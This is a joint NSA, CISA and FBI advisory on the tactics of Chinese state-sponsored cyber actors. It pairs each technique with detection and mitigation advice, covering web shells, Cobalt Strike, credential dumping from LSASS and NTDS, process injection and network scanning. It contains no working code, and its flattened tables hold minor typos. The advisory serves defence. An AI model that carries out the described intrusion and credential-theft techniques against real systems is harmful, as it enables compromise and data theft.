For information on Common Vulnerabilities and Exposures (CVE) known to be exploited by malicious Chinese state-sponsored cyber actors, see: CISA-FBI Joint CSA AA20-133A: Top 10 Routinely Exploited Vulnerabilities, CISA Activity Alert: AA20-275A: Potential for China Cyber Response to Heightened U.S.-China Tensions, and NSA CSA U/OO/179811-20: Chinese State-Sponsored Actors Exploit Publicly Known Vulnerabilities. 
Encrypted Multi-Hop Proxies.
Chinese state-sponsored cyber actors have been routinely observed using a VPS as an encrypted proxy.
The cyber actors use the VPS as well as small office and home office (SOHO) devices as operational nodes to evade detection. 
Observed Tactics and Techniques Chinese state-sponsored cyber actors use a full array of tactics and techniques to exploit computer networks of interest worldwide and to acquire sensitive intellectual property, economic, political, and military information.
Appendix B: MITRE ATT&CK Framework lists the tactics and techniques used by Chinese state-sponsored cyber actors.
A downloadable JSON file is also available on the NSA Cybersecurity GitHub page. 
Refer to Appendix A: Chinese State-Sponsored Cyber Actors’ Observed Procedures for information on procedures affiliated with these tactics and techniques as well as applicable mitigations. 
Figure 1: Example of tactics and techniques used in various cyber operations. 
Mitigations NSA, CISA, and FBI urge federal and SLTT government, CI, DIB, and private industry organizations to apply the following recommendations as well as the detection and mitigation recommendations in Appendix A, which are tailored to observed tactics and techniques: Patch systems and equipment promptly and diligently.
Focus on patching critical and high vulnerabilities that allow for remote code execution or denial-of-service on externally facing equipment and CVEs known to be exploited by Chinese state-sponsored cyber actors.
Consider implementing a patch management program that enables a timely and thorough patching cycle. 
Note: for more information on CVEs routinely exploited by Chinese state-sponsored cyber actors refer to the resources listed in the Trends in Chinese State-Sponsored Cyber Operations section. 
Enhance monitoring of network traffic, email, and endpoint systems.
Review network signatures and indicators for focused activities, monitor for new phishing themes, and adjust email rules accordingly.
Follow the best practices of restricting attachments via email and blocking URLs and domains based upon reputation.
Ensure that log information is aggregated and correlated to enable maximum detection capabilities, with a focus on monitoring for account misuse.
Monitor common ports and protocols for command and control (C2) activity.
SSL/TLS inspection can be used to see the contents of encrypted sessions to look for network-based indicators of malware communication protocols.
Implement and enhance network and endpoint event analysis and detection capabilities to identify initial infections, compromised credentials, and the manipulation of endpoint processes and files. 
Use protection capabilities to stop malicious activity.
Implement anti-virus software and other endpoint protection capabilities to automatically detect and prevent malicious files from executing.
Use a network intrusion detection and prevention system to identify and prevent commonly employed adversarial malware and limit nefarious data transfers.
Use a domain reputation service to detect suspicious or malicious domains.
Use strong credentials for service accounts and multi-factor authentication (MFA) for remote access to mitigate an adversary's ability to leverage stolen credentials, but be aware of MFA interception techniques for some MFA implementations.:black_small_square: Resources Refer to us-cert.cisa.gov/china, https://www.ic3.gov/Home/IndustryAlerts, and https://www.nsa.gov/What-We-Do/Cybersecurity/Advisories-Technical-Guidance/ for previous reporting on Chinese state-sponsored malicious cyber activity. 
Disclaimer of Endorsement The information and opinions contained in this document are provided "as is" and without any warranties or guarantees.
Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United States Government, and this guidance shall not be used for advertising or product endorsement purposes. 
Purpose 
This document was developed by NSA, CISA, and FBI in furtherance of their respective cybersecurity missions, including their responsibilities to develop and issue cybersecurity specifications and mitigations.
This information may be shared broadly to reach all appropriate stakeholders. 
This document is marked TLP:WHITE.
Disclosure is not limited.
Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release.
Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction.
For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp/. Trademark Recognition MITRE and ATT&CK are registered trademarks of The MITRE Corporation.
• D3FEND is a trademark of The MITRE Corporation.
•
Microsoft, Microsoft Exchange, Office 365, Microsoft Office, OneDrive, Outlook, OWA, PowerShell, Windows Defender, and Windows are registered trademarks of Microsoft Corporation.
Pulse Secure is a registered trademark of Pulse Secure, LLC.
Apache is a registered trademark of Apache Software Foundation.
• F5 and BIG-IP are registered trademarks of F5 Networks.
• Cobalt Strike is a registered trademark of Strategic Cyber LLC.
GitHub is a registered trademark of GitHub, Inc. •
JavaScript is a registered trademark of Oracle Corporation.
Python is a registered trademark of Python Software Foundation.
Unix is a registered trademark of The Open Group.
Linux is a registered trademark of Linus Torvalds.
Dropbox is a registered trademark of Dropbox, Inc. APPENDIX A: Chinese State-Sponsored Cyber Actors’ Observed Procedures Note: D3FEND techniques are based on the Threat Actor Procedure(s) and may not match automated mappings to ATT&CK techniques and sub-techniques. 
Tactics: Reconnaissance [TA0043] Table 1: Chinese state-sponsored cyber actors’ Reconnaissance TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques 
Active Scanning [T1595] Chinese state-sponsored cyber actors have been assessed to perform reconnaissance on Microsoft:registered: 365 (M365), formerly Office:registered: 365, resources with the intent of further gaining information about the networks.
These scans can be automated, through Python:registered: scripts, to locate certain files, paths, or vulnerabilities.
The cyber actors can gain valuable information on the victim network, such as the allocated resources, an organization’s fully qualified domain name, IP address space, and open ports to target or exploit. 
Minimize the amount and sensitivity of data available to external parties, for example: Scrub user email addresses and contact lists from public websites, which can be used for social engineering, Share only necessary data and information with third parties, and Monitor and limit third-party access to the network. 
Active scanning from cyber actors may be identified by monitoring network traffic for sources associated with botnets, adversaries, and known bad IPs based on threat intelligence. 
Detect: Network Traffic Analysis Connection Attempt Analysis
[D3-CAA] Isolate: Network Isolation Inbound Traffic Filtering [D3-ITF] Gather Victim Network Information
[T1590] Tactics: Resource Development [TA0042] Table II:
Chinese state-sponsored cyber actors’ Resource Development TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Acquire Infrastructure [T1583] Chinese state-sponsored cyber actors have been observed using VPSs from cloud service providers that are physically distributed around the world to host malware and function as C2 nodes. 
Adversary activities occurring outside the organization’s boundary of control and view makes mitigation difficult.
Organizations can monitor for unexpected network traffic and data flows to and from VPSs and correlate other suspicious activity that may indicate an active threat. 
N/A Stage Capabilities [T1608] Obtain Capabilities
[T1588]: Tools [T1588.002] Chinese state-sponsored cyber actors have been observed using Cobalt Strike:registered: and tools from GitHub:registered: on victim networks. 
Organizations may be able to identify malicious use of Cobalt Strike by: Examining network traffic using Transport Layer Security (TLS) inspection to identify Cobalt Strike.
Look for human generated vice machine-generated traffic, which will be more uniformly distributed. 
Looking for the default Cobalt Strike TLS certificate. 
Look at the user agent that generates the TLS traffic for discrepancies that may indicate faked and malicious traffic. 
Review the traffic destination domain, which may be malicious and an indicator of compromise. 
Look at the packet's HTTP host header.
If it does not match with the destination domain, it may indicate a fake Cobalt Strike header and profile. 
Check the Uniform Resource Identifier (URI) of the flow to see if it matches one associated with Cobalt Strike's malleable C2 language.
If discovered, additional recovery and investigation will be required. 
N/A Tactics: Initial Access [TA0001] Table III: Chinese state-sponsored cyber actors’ Initial Access TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Detection and Mitigation Recommendations Drive By Compromise
[T1189] Chinese state-sponsored cyber actors have been observed gaining access to victim networks through watering hole campaigns of typo-squatted domains. 
Ensure all browsers and plugins are kept up to date. 
Use modern browsers with security features turned on. 
Restrict the use of unneeded websites, block unneeded downloads/attachments, block unneeded JavaScript:registered:, restrict browser extensions, etc. Use adblockers to help prevent malicious code served through advertisements from executing. 
Use script blocking extensions to help prevent the execution of unneeded JavaScript, which may be used during exploitation processes. 
Use browser sandboxes or remote virtual environments to mitigate browser exploitation. 
Use security applications that look for behavior used during exploitation, such as Windows Defender:registered: Exploit Guard (WDEG). 
Detect: Identifier Analysis Homoglyph Detection
[D3-HD] URL Analysis [D3-UA] File Analysis Dynamic Analysis [D3-DA] Isolate: Execution Isolation Hardware-based Process Isolation [D3-HBPI] Executable Allowlisting
[D3-EAL] Network Isolation DNS Denylisting [D3-DNSDL] Outbound Traffic Filtering [D3-OTF] Exploit Public-Facing Application [T1190] Chinese state-sponsored cyber actors have exploited known vulnerabilities in Internet-facing systems.[1]
For information on vulnerabilities known to be exploited by Chinese state-sponsored cyber actors, refer to the Trends in Chinese State-Sponsored Cyber Operations section for a list of resources. 
Chinese state-sponsored cyber actors have also been observed: Using short-term VPS devices to scan and exploit vulnerable Microsoft Exchange:registered: Outlook Web Access (OWA:registered:) and plant webshells. 
Targeting on-premises Identity and Access Management (IdAM) and federation services in hybrid cloud environments to gain access to cloud resources. 
Deploying a public proof of concept (POC) exploit targeting a public-facing appliance vulnerability. 
Review previously published alerts and advisories from NSA, CISA, and FBI, and diligently patch vulnerable applications known to be exploited by cyber actors.
Refer to the Trends in Chinese State-Sponsored Cyber Operations section for a non-inclusive list of resources. 
Additional mitigations include: Consider implementing Web Application Firewalls (WAF), which can prevent exploit traffic from reaching an application. 
Segment externally facing servers and services from the rest of the network with a demilitarized zone (DMZ). 
Use multi-factor authentication (MFA) with strong factors and require regular re-authentication. 
Disable protocols using weak authentication. 
Limit access to and between cloud resources with the desired state being a Zero Trust model.
For more information refer to NSA Cybersecurity Information Sheet: [Embracing a Zero Trust Security Model]. 
When possible, use cloud-based access controls on cloud resources (e.g., cloud service provider (CSP)-managed authentication between virtual machines). 
Use automated tools to audit access logs for security concerns. 
Where possible, enforce MFA for password resets. 
Do not include Application Programing Interface (API) keys in software version control systems where they can be unintentionally leaked. Harden: 
Application Hardening [D3-AH] 
Platform Hardening Software Update [D3-SU] Detect: File Analysis
[D3-FA] Network Traffic Analysis Client-server Payload Profiling [D3-CSPP] Process Analysis Process Spawn Analysis Process Lineage Analysis [D3-PLA] Isolate: Network Isolation Inbound Traffic Filtering [D3-ITF] 
Phishing [T1566]: Spearphishing Attachment [T1566.001] Spearphishing Link
[T1566.002] Chinese state-sponsored cyber actors have been observed conducting spearphishing campaigns.
These email compromise attempts range from generic emails with mass targeted phishing attempts to specifically crafted emails in targeted social engineering lures. 
These compromise attempts use the cyber actors’ dynamic collection of VPSs, previously compromised accounts, or other infrastructure in order to encourage engagement from the target audience through domain typo-squatting and masquerading.
These emails may contain a malicious link or files that will provide the cyber actor access to the victim’s device after the user clicks on the malicious link or opens the attachment. 
Implement a user training program and simulated spearphishing emails to discourage users from visiting malicious websites or opening malicious attachments and re-enforce the appropriate user responses to spearphishing emails.
Quarantine suspicious files with antivirus solutions. 
Use a network intrusion prevention system (IPS) to scan and remove malicious email attachments. 
Block uncommon file types in emails that are not needed by general users (.exe, .jar,.vbs) 
Use anti-spoofing and email authentication mechanisms to filter messages based on validity checks of the sender domain (using Sender Policy Framework
[SPF]) and integrity of messages (using Domain Keys Identified Mail
[DKIM]).
Enabling these mechanisms within an organization (through policies such as Domain-based Message Authentication, Reporting, and Conformance
[DMARC]) may enable recipients (intra-org and cross domain) to perform similar message filtering and validation. 
Determine if certain websites that can be used for spearphishing are necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk. 
Prevent users from clicking on malicious links by stripping hyperlinks or implementing "URL defanging" at the Email Security Gateway or other email security tools. 
Add external sender banners to emails to alert users that the email came from an external sender. 
Harden: 
Message Hardening Message Authentication [D3-MAN] Transfer Agent Authentication
[D3-TAAN] Detect: File Analysis Dynamic Analysis
[D3-DA] Identifier Analysis Homoglyph Detection [D3-HD] URL Analysis [D3-UA] Message Analysis Sender MTA Reputation Analysis
[D3-SMRA] Sender Reputation Analysis [D3-SRA] External Remote Services
[T1133] Chinese state-sponsored cyber actors have been observed: Exploiting vulnerable devices immediately after conducting scans for critical zero-day or publicly disclosed vulnerabilities.
The cyber actors used or modified public proof of concept code in order to exploit vulnerable systems. 
Targeting Microsoft Exchange offline address book (OAB) virtual directories (VDs). 
Exploiting Internet accessible webservers using webshell small code injections against multiple code languages, including net, asp, apsx, php, japx, and cfm. 
Note: refer to the references listed above in Exploit Public-Facing Application [T1190] for information on CVEs known to be exploited by malicious Chinese cyber actors. 
Note: this technique also applies to Persistence [TA0003]. 
Many exploits can be mitigated by applying available patches for vulnerabilities (such as CVE-2019-11510, CVE-2019-19781, and CVE-2020-5902) affecting external remote services. 
Reset credentials after virtual private network (VPN) devices are upgraded and reconnected to the external network. 
Revoke and generate new VPN server keys and certificates (this may require redistributing VPN connection information to users). 
Disable Remote Desktop Protocol (RDP) if not required for legitimate business functions. 
Restrict VPN traffic to and from managed service providers (MSPs)
using a dedicated VPN connection. 
Review and verify all connections between customer systems, service provider systems, and other client enclaves. 
Harden: Software Update [D3-SU] Detect: Network Traffic Analysis Connection Attempt Analysis
[D3-CAA] Platform Monitoring [D3-PM] Process Analysis Process Spawn Analysis
[D3-SPA] Process Lineage Analysis [D3-PLA] Valid Accounts
[T1078]: Default Accounts [T1078.001] Domain Accounts [T1078.002] Chinese state-sponsored cyber actors have been observed: gaining credential access into victim networks by using legitimate, but compromised credentials to access OWA servers, corporate login portals, and victim networks. 
Note: this technique also applies to Persistence
[TA0003], Privilege Escalation [TA0004], and Defense Evasion [TA0005]. 
Adhere to best practices for password and permission management. 
Ensure that MSP accounts are not assigned to administrator groups and restrict those accounts to only systems they manage Do not store credentials or sensitive data in plaintext. 
Change all default usernames and passwords. 
Routinely update and secure applications using Secure Shell (SSH). 
Update SSH keys regularly and keep private keys secure. 
Routinely audit privileged accounts to identify malicious use. Harden: Credential Hardening Multi-factor Authentication [D3-MFA] Detect: User Behavior Analysis
[D3-UBA] Authentication Event Thresholding [D3-ANET] Job Function Access Pattern Analysis
[D3-JFAPA] Tactics: Execution
[TA0002] Table IV: Chinese state-sponsored cyber actors’ Execution TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Command and Scripting Interpreter
[T1059
]: PowerShell:registered: [T1059.001] Windows:registered: Command Shell [T1059.003] Unix:registered: Shell
[T1059.004] Python
[T1059.006] JavaScript [T1059.007] Network Device CLI [T1059.008] Chinese state-sponsored cyber actors have been observed: Using cmd.exe, JavaScript/Jscript Interpreter, and network device command line interpreters (CLI). 
Using PowerShell to conduct reconnaissance, enumeration, and discovery of the victim network. 
Employing Python scripts to exploit vulnerable servers. 
Using a UNIX shell in order to conduct discovery, enumeration, and lateral movement on Linux:registered: servers in the victim network. 
PowerShell Turn on PowerShell logging.
(Note: this works better in newer versions of PowerShell.
NSA, CISA, and FBI recommend using version 5 or higher.) 
Push Powershell logs into a security information and event management (SIEM) tool. 
Monitor for suspicious behavior and commands.
Regularly evaluate and update blocklists and allowlists. 
Use an antivirus program, which may stop malicious code execution that cyber actors attempt to execute via PowerShell. 
Remove PowerShell if it is not necessary for operations. 
Restrict which commands can be used. 
Windows Command Shell Restrict use to administrator, developer, or power user systems.
Consider its use suspicious and investigate, especially if average users run scripts. 
Investigate scripts running out of cycle from patching or other administrator functions if scripts are not commonly used on a system, but enabled. Monitor for and investigate other unusual or suspicious scripting behavior. 
Unix Use application controls to prevent execution. 
Monitor for and investigate unusual scripting behavior.
Use of the Unix shell may be common on administrator, developer, or power user systems.
In this scenario, normal users running scripts should be considered suspicious. 
If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions should be considered suspicious. 
Python Audit inventory systems for unauthorized Python installations. 
Blocklist Python where not required. 
Prevent users from installing Python where not required. 
JavaScript Turn off or restrict access to unneeded scripting components. 
Blocklist scripting where appropriate. 
For malicious code served up through ads, adblockers can help prevent that code from executing. 
Network Device Command Line Interface (CLI) Use TACACS+ to keep control over which commands administrators are permitted to use through the configuration of authentication and command authorization. 
Use an authentication, authorization, and accounting (AAA) systems to limit actions administrators can perform and provide a history of user actions to detect unauthorized use and abuse. 
Ensure least privilege principles are applied to user accounts and groups. 
Harden: 
Platform Hardening [D3-PH] Detect: Process Analysis Script Execution Analysis
[D3-SEA] Isolate: Execution Isolation Executable Allowlisting
[D3-EAL] Scheduled Task/Job [T1053] Cron
[T1053.003] Scheduled Task
[T1053.005] Chinese state-sponsored cyber actors have been observed using Cobalt Strike, webshells, or command line interface tools, such as schtask or crontab to create and schedule tasks that enumerate victim devices and networks. 
Note: this technique also applies to Persistence [TA0003] and Privilege Escalation [TA0004]. 
• Monitor scheduled task creation from common utilities using command-line invocation and compare for any changes that do not correlate with known software, patch cycles, or other administrative activity. 
• Configure event logging for scheduled task creation and monitor process execution from svchost.exe (Windows 10) and Windows Task Scheduler (Older version of Windows) to look for changes in %systemroot%\System32\Tasks that do not correlate with known software, patch cycles, or other administrative activity.
Additionally monitor for any scheduled tasks created via command line utilities—such as PowerShell or Windows Management Instrumentation (WMI)—that do not conform to typical administrator or user actions. 
Detect: Platform Monitoring Operating System Monitoring [D3-OSM] Scheduled Job Analysis [D3-SJA] System Daemon Monitoring [D3-SDM] System File Analysis
[D3-SFA] Isolate: Execution Isolation Executable Allowlisting
[D3-EAL] User Execution [T1204] Malicious Link [T1204.001] Malicious File [T1204.002] Chinese state-sponsored cyber actors have been observed conducting spearphishing campaigns that encourage engagement from the target audience.
These emails may contain a malicious link or file that provide the cyber actor access to the victim’s device after the user clicks on the malicious link or opens the attachment. 
Use an antivirus program, which may stop malicious code execution that cyber actors convince users to attempt to execute. 
Prevent unauthorized execution by disabling macro scripts from Microsoft Office files transmitted via email.
Consider using Office Viewer software to open Microsoft Office files transmitted via email instead of full Microsoft Office suite applications. 
Use a domain reputation service to detect and block suspicious or malicious domains. 
Determine if certain categories of websites are necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk. 
Use browser and application sandboxes or remote virtual environments to mitigate browser or other application exploitation. 
Detect: File Analysis Dynamic Analysis
[D3-DA] File Content Rules [D3-FCR] Identifier Analysis Homoglyph Detection
[D3-HD] URL Analysis [D3-UA] Network Traffic Analysis DNS Traffic Analysis
[D3-DNSTA] Isolate: Execution Isolation Hardware-based Process Isolation [D3-HBPI] Executable Allowlisting
[D3-EAL] Network Isolation DNS Denylisting [D3-DNSDL] Outbound Traffic Filtering [D3-OTF] Tactics: Persistence [TA0003] Table V: Chinese state-sponsored cyber actors’
Persistence TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) 
Detection and Mitigation Recommendations Defensive Tactics and Techniques Hijack Execution Flow
[T1574]: DLL Search Order Hijacking [T1574.001] Chinese state-sponsored cyber actors have been observed using benign executables which used Dynamic Link Library (DLL) load-order hijacking to activate the malware installation process. 
Note: this technique also applies to Privilege Escalation [TA0004] and Defense Evasion [TA0005]. 
Disallow loading of remote DLLs. 
Enable safe DLL search mode. 
Implement tools for detecting search order hijacking opportunities. 
Use application allowlisting to block unknown DLLs. 
Monitor the file system for created, moved, and renamed DLLs. 
Monitor for changes in system DLLs not associated with updates or patches. 
Monitor DLLs loaded by processes (e.g., legitimate name, but abnormal path). 
Detect: Platform Monitoring Operating System Monitoring Service Binary Verification
[D3-SBV] Process Analysis File Access Pattern Analysis
[D3-FAPA] Isolate: Execution Isolation Executable Allowlisting
[D3-EAL] Modify Authentication Process
[T1556] Domain Controller Authentication [T1556.001] Chinese state-sponsored cyber actors were observed creating a new sign-in policy to bypass MFA requirements to maintain access to the victim network. 
Note: this technique also applies to Defense Evasion
[TA0005] and Credential Access
[TA0006]. 
Monitor for policy changes to authentication mechanisms used by the domain controller. 
Monitor for modifications to functions exported from authentication DLLs (such as cryptdll.dll and samsrv.dll). 
Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. 
Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts (for example, one account logged into multiple systems simultaneously, multiple accounts logged into the same machine simultaneously, accounts logged in at odd times or outside of business hours). 
Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access). 
Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer.
Monitor for and correlate changes to Registry entries. 
Detect: Process Analysis
[D3-PA] User Behavior Analysis Authentication Event Thresholding
[D3-ANET] User Geolocation Logon Pattern Analysis
[D3-UGLPA] Server Software Component [T1505]: Web Shell [T1505.003] Chinese state-sponsored cyber actors have been observed planting web shells on exploited servers and using them to provide the cyber actors with access to the victim networks. 
Use Intrusion Detection Systems (IDS) to monitor for and identify China Chopper traffic using IDS signatures. Monitor and search for predictable China Chopper shell syntax to identify infected files on hosts. 
Perform integrity checks on critical servers to identify and investigate unexpected changes. 
Have application developers sign their code using digital signatures to verify their identity. Identify and remediate web application vulnerabilities or configuration weaknesses.
Employ regular updates to applications and host operating systems. 
Implement a least-privilege policy on web servers to reduce adversaries’ ability to escalate privileges or pivot laterally to other hosts and control creation and execution of files in particular directories. 
If not already present, consider deploying a DMZ between web-facing systems and the corporate network.
Limiting the interaction and logging traffic between the two provides a method to identify possible malicious activity. 
Ensure secure configuration of web servers.
All unnecessary services and ports should be disabled or blocked.
Access to necessary services and ports should be restricted, where feasible.
This can include allowlisting or blocking external access to administration panels and not using default login credentials. 
Use a reverse proxy or alternative service, such as mod_security, to restrict accessible URL paths to known legitimate ones. 
Establish, and backup offline, a “known good” version of the relevant server and a regular change management policy to enable monitoring for changes to servable content with a file integrity system. 
Employ user input validation to restrict exploitation of vulnerabilities. 
Conduct regular system and application vulnerability scans to establish areas of risk.
While this method does not protect against zero-day exploits, it will highlight possible areas of concern. 
Deploy a web application firewall and conduct regular virus signature checks, application fuzzing, code reviews, and server network analysis. 
Detect: Network Traffic Analysis Client-server Payload Profiling [D3-CSPP] Per Host Download-Upload Ratio Analysis
[D3-PHDURA] Process Analysis Process Spawn Analysis Process Lineage Analysis [D3-PLA] Isolate: Network Isolation Inbound Traffic Filtering [D3-ITF] Create or Modify System Process
[T1543]: Windows Service [T1543.003] Chinese state-sponsored cyber actors have been observed executing malware shellcode and batch files to establish new services to enable persistence. 
Note: this technique also applies to Privilege Escalation [TA0004]. 
Only allow authorized administrators to make service changes and modify service configurations. 
Monitor processes and command-line arguments for actions that could create or modify services, especially if such modifications are unusual in your environment. 
Monitor WMI and PowerShell for service modifications. 
Detect: Process Analysis Process Spawn Analysis
[D3-PSA] Tactics: Privilege Escalation [TA0004] Table VI: Chinese state-sponsored cyber actors’ Privilege Escalation TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Domain Policy Modification
[T1484] Group Policy Modification
[T1484.001] Chinese state-sponsored cyber actors have also been observed modifying group policies for password exploitation. 
[TA0005]. Identify and correct Group Policy Object (GPO) permissions abuse opportunities (e.g., GPO modification privileges) using auditing tools. 
Monitor directory service changes using Windows event logs to detect GPO modifications.
Several events may be logged for such GPO modifications. 
Consider implementing WMI and security filtering to further tailor which users and computers a GPO will apply to. 
Detect: Network Traffic Analysis Administrative Network Activity Analysis
[D3-ANAA] Platform Monitoring Operating System Monitoring System File Analysis [D3-SFA] Process Injection
[T1055]: Dynamic Link Library Injection [T1055.001] Portable Executable Injection
[T1055.002] Chinese state-sponsored cyber actors have been observed: Injecting into the rundll32.exe process to hide usage of Mimikatz, as well as injecting into a running legitimate explorer.exe process for lateral movement. 
Using shellcode that injects implants into newly created instances of the Service Host process (svchost) 
Note: this technique also applies to
Defense Evasion
[TA0005]. 
Use endpoint protection software to block process injection based on behavior of the injection process. 
Monitor DLL/Portable Executable (PE) file events, specifically creation of these binary files as well as the loading of DLLs into processes.
Look for DLLs that are not recognized or not normally loaded into a process. 
Monitor for suspicious sequences of Windows API calls such as CreateRemoteThread, VirtualAllocEx, or WriteProcessMemory and analyze processes for unexpected or atypical behavior such as opening network connections or reading files. 
To minimize the probable impact of a threat actor using Mimikatz, always limit administrative privileges to only users who actually need it; upgrade Windows to at least version 8.1 or 10; run Local Security Authority Subsystem Service (LSASS) in protected mode on Windows 8.1 and higher; harden the local security authority (LSA) to prevent code injection. 
Execution Isolation Hardware-based Process Isolation [D3-HBPI] Mandatory Access Control
[D3-MAC] Tactics: Defense Evasion
[TA0005] Table VII:
Chinese state-sponsored cyber actors’ Defensive Evasion TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Deobfuscate/Decode Files or Information [T1140] Chinese state-sponsored cyber actors were observed using the 7-Zip utility to unzip imported tools and malware files onto the victim device. 
Monitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior. 
Consider blocking, disabling, or monitoring use of 7-Zip. Detect: 
Process Analysis Process Spawn Analysis [D3-PSA] Isolate: Execution Isolation Executable Denylisting
[D3-EDL] Hide Artifacts
[T1564] Chinese state-sponsored cyber actors were observed using benign executables which used DLL load-order hijacking to activate the malware installation process. 
Monitor files, processes, and command-line arguments for actions indicative of hidden artifacts, such as executables using DLL load-order hijacking that can activate malware. 
Monitor event and authentication logs for records of hidden artifacts being used. 
Monitor the file system and shell commands for hidden attribute usage. 
Detect: Process Analysis File Access Pattern Analysis
[D3-FAPA] Isolate: Execution Isolation Executable Allowlisting
[D3-EAL] Indicator Removal from Host [T1070] Chinese state-sponsored cyber actors have been observed deleting files using rm or del commands. 
Several files that the cyber actors target would be timestomped, in order to show different times compared to when those files were created/used. 
Make the environment variables associated with command history read only to ensure that the history is preserved. 
Recognize timestomping by monitoring the contents of important directories and the attributes of the files. 
Prevent users from deleting or writing to certain files to stop adversaries from maliciously altering their ~/.bash_history or ConsoleHost_history.txt files. 
Monitor for command-line deletion functions to correlate with binaries or other files that an adversary may create and later remove.
Monitor for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. 
Monitor and record file access requests and file handles.
An original file handle can be correlated to a compromise and inconsistencies between file timestamps and previous handles opened to them can be a detection rule. 
Detect: Platform Monitoring Operating System Monitoring System File Analysis
[D3-SFA] Process Analysis File Access Pattern Analysis
[D3-EAL] Obfuscated Files or Information [T1027] Chinese state-sponsored cyber actors were observed Base64 encoding files and command strings to evade security measures. 
Consider utilizing the Antimalware Scan Interface (AMSI) on Windows 10 to analyze commands after being processed/interpreted. 
Detect: Process Analysis File Access Pattern Analysis
[D3-FAPA] Signed Binary Proxy Execution
[T1218] Mshta [T1218.005] Rundll32 [T1218.011] Chinese state-sponsored cyber actors were observed using Microsoft signed binaries, such as Rundll32, as a proxy to execute malicious payloads. 
Monitor processes for the execution of known proxy binaries (e.g., rundll32.exe) and look for anomalous activity that does not follow historically good arguments and loaded DLLs associated with the invocation of the binary. 
Detect: Process Analysis File Access Pattern Analysis
[D3-FAPA] Process Spawn Analysis [D3-PSA] Tactics: Credential Access [TA0006] Table VIII:
Chinese state-sponsored cyber actors’ Credential Access TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Exploitation for
Credential Access
[T1212] Chinese state-sponsored cyber actors have been observed exploiting Pulse Secure VPN appliances to view and extract valid user credentials and network information from the servers. 
Update and patch software regularly. 
Use cyber threat intelligence and open-source reporting to determine vulnerabilities that threat actors may be actively targeting and exploiting; patch those vulnerabilities immediately. 
Platform Hardening Software Update [D3-SU] Credential Hardening Multi-factor Authentication [D3-MFA] OS Credential Dumping [T1003] • LSASS Memory [T1003.001] • NTDS
[T1003.003] Chinese state-sponsored cyber actors were observed targeting the LSASS process or Active directory (NDST.DIT) for credential dumping. 
Monitor process and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NDST.DIT. 
Ensure that local administrator accounts have complex, unique passwords across all systems on the network. 
Limit credential overlap across accounts and systems by training users and administrators not to use the same passwords for multiple accounts. 
Consider disabling or restricting NTLM. 
Consider disabling WDigest authentication. 
Ensure that domain controllers are backed up and properly secured (e.g., encrypt backups). 
Implement Credential Guard to protect the LSA secrets from credential dumping on Windows 10.
This is not configured by default and requires hardware and firmware system requirements. 
Enable Protected Process Light for LSA on Windows 8.1 and Windows Server 2012 R2. 
Harden: Credential Hardening [D3-CH] Detect: Process Analysis File Access Pattern Analysis
[D3-FAPA] System Call Analysis [D3-SCA] Isolate: Execution Isolation Hardware-based Process Isolation [D3-HBPI] Mandatory Access Control [D3-MAC] Tactics: Discovery [TA0007] Table IX: Chinese state-sponsored cyber actors’
Discovery TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) 
Detection and Mitigation Recommendations Defensive Tactics and Techniques File and Directory Discovery
[T1083] Chinese state-sponsored cyber actors have been observed using multiple implants with file system enumeration and traversal capabilities. 
Monitor processes and command-line arguments for actions that could be taken to gather system and network information.
WMI and PowerShell should also be monitored. 
Detect: User Behavior Analysis Job Function Access Pattern Analysis
[D3-JFAPA] Process Analysis Database Query String Analysis
[D3-DQSA] File Access Pattern Analysis
[D3-FAPA] Process Spawn Analysis [D3-PSA] Permission Group Discovery [T1069] Chinese state-sponsored cyber actors have been observed using commands, including net group and net localgroup, to enumerate the different user groups on the target network. 
Remote access tools with built-in features may interact directly with the Windows API to gather information.
Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell. 
Detect: Process Analysis Process Spawn Analysis
[D3-PSA] System Call Analysis
[D3-SCA] User Behavior Analysis [D3-UBA] Process Discovery [T1057] Chinese state-sponsored cyber actors have been observed using commands, including tasklist, jobs, ps, or taskmgr, to reveal the running processes on victim devices. 
Normal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used.
Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell. 
[D3-SCA] User Behavior Analysis [D3-UBA] Network Service Scanning [T1046] Chinese state-sponsored cyber actors have been observed using Nbtscan and nmap to scan and enumerate target network information. 
• Ensure that unnecessary ports and services are closed to prevent discovery and potential exploitation. 
• Use network intrusion detection and prevention systems to detect and prevent remote service scans such as Nbtscan or nmap. 
